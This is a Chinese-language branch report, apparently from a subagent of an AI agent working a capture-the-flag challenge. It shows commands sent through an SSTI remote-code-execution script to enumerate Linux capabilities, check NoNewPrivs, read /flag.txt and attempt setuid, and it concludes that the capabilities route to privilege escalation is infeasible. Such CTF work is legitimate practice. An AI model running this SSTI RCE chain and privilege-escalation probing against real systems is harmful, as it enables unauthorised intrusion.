## Branch Result
direction: capabilities
subagent_id: branch_004
status: INFEASIBLE

### 发现
- 远端 `/sbin/getcap` 存在，但 `getcap -r / 2>/dev/null` 没有输出任何带 file capability 的文件。
- 以独立 `find ... -exec getcap` 方式复核，仍无任何输出；`getcap -r /usr` 也无 capability 记录且返回码为 0。
- SSTI 命令进程身份为 uid/gid 1000，所有继承、许可、有效及 ambient capability 集均为 0；仅 bounding set 非空。
- `NoNewPrivs: 1` 已启用。因此该 SSTI 进程及其后代不能通过执行带 file capability 的程序获得新权限；即使另有未遍历到的 capability 文件，也不能由此 RCE 链利用。
- `/flag.txt` 权限为 `0700`, owner/group 均为 uid/gid 1001 (`dragon_lord`)。直接读取返回 Permission denied。
- 当前 Python 解释器的实际 ELF `/usr/local/bin/python3.8` 没有 file capability；直接 `os.setuid(1001)` 返回 EPERM。

### 命令和结果
命令：
```bash
python3 ssti_rce.py 'id; echo GETCAP_PATH; command -v getcap || true'
```
结果：
```text
uid=1000(zhuixu) gid=1000(zhuixu) groups=1000(zhuixu)
GETCAP_PATH
/sbin/getcap
```

全盘 capability 枚举命令：
```bash
python3 ssti_rce.py 'getcap -r / 2>/dev/null'
```
结果：空输出（未发现任何 file capability）。

独立复核命令：
```bash
python3 ssti_rce.py 'find / -xdev -type f -exec getcap {} + 2>/dev/null'
```
结果：空输出。

`/usr` 树及 Python ELF 精确核验：
```bash
python3 ssti_rce.py 'ls -l /usr/local/bin/python3 /usr/local/bin/python3.8; getcap -v /usr/local/bin/python3.8 2>&1; getcap -r /usr 2>/dev/null; echo RC:$?'
```
结果：
```text
lrwxrwxrwx 1 root root     9 Nov 23  2019 /usr/local/bin/python3 -> python3.8
-rwxr-xr-x 1 root root 42496 Nov 23  2019 /usr/local/bin/python3.8
/usr/local/bin/python3.8
RC:0
```
说明：`getcap -v` 只打印路径而未打印 `cap_...=...`，表示该 ELF 没有 file capability；随后 `/usr` 递归枚举同样无记录。

进程 capability 与 `no_new_privs`：
```bash
python3 ssti_rce.py 'grep -E "^(Uid|Gid|Cap|NoNewPrivs)" /proc/self/status 2>&1'
```
结果：
```text
Uid:	1000	1000	1000	1000
Gid:	1000	1000	1000	1000
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	00000000a80425fb
CapAmb:	0000000000000000
NoNewPrivs:	1
```

目标文件权限与直接读取验证：
```bash
python3 ssti_rce.py 'ls -l /flag.txt; stat -c "%a %u %g %n" /flag.txt'
python3 ssti_rce.py 'cat /flag.txt 2>&1; echo CAT_RC:$?'
```
结果：
```text
-rwx------ 1 dragon_lord dragon_lord 43 Jul 30 16:00 /flag.txt
700 1001 1001 /flag.txt
cat: /flag.txt: Permission denied
CAT_RC:1
```

切换 uid=1001 验证：
```bash
python3 ssti_rce.py 'python3 -c "import os;os.setuid(1001);print(os.getuid())" 2>&1; echo SETUID_RC:$?'
```
结果：
```text
Traceback (most recent call last):
  File "<string>", line 1, in <module>
PermissionError: [Errno 1] Operation not permitted
SETUID_RC:1
```

`capsh` 交叉核验：
```bash
python3 ssti_rce.py 'capsh --print 2>&1 | head -n 12'
```
关键结果：
```text
Current: =
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
uid=1000(zhuixu)
gid=1000(zhuixu)
groups=1000(zhuixu)
```

### 结论
capabilities 方向不可行。系统中未枚举到任何带 file capability 的文件，当前进程也没有有效/许可 capability；同时 `NoNewPrivs=1` 阻断通过 exec 获得 file capability。实测既无法读取 `/flag.txt`，也无法切换到 uid=1001。建议主线停止 capabilities 路线，转查 SUID/SGID、以 uid=1001 运行的服务/任务或其他授权边界。
